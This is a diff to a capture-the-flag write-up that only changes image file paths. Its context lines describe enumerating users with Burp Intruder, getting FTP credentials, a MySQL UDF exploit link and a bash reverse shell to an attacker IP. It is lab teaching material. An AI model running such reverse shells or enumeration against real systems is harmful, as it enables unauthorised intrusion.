@@ -42,7 +42,7 @@ If we did this a user that does not exist, it would tell us `Invalid Credentials
 
 With this boolean condition, we can brute force all possible users within the machine. I used Burp Intruder to do so:
 
-<figure><img src="../../../.gitbook/assets/image (49) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (49) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then I filtered the results using the `Invalid Login` string.
 
@@ -56,7 +56,7 @@ So `blue` is the user on this machine. We can use the secret we found earlier to
 
 With access to this new user, we can view more hidden notes:
 
-<figure><img src="../../../.gitbook/assets/image (43) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 The first one was the most interesting as it revealed some FTP Credentials:
 
@@ -158,7 +158,7 @@ There are more detailed instructions here:
 
 {% embed url="https://www.exploit-db.com/raw/1518" %}
 
-<figure><img src="../../../.gitbook/assets/image (47) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (47) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Afterwards, we can just use the `do_system('bash -c "bash -i >& /dev/tcp/10.10.16.12/21 0>&1"');` function we defined to gain a reverse shell on the machine.&#x20;
 
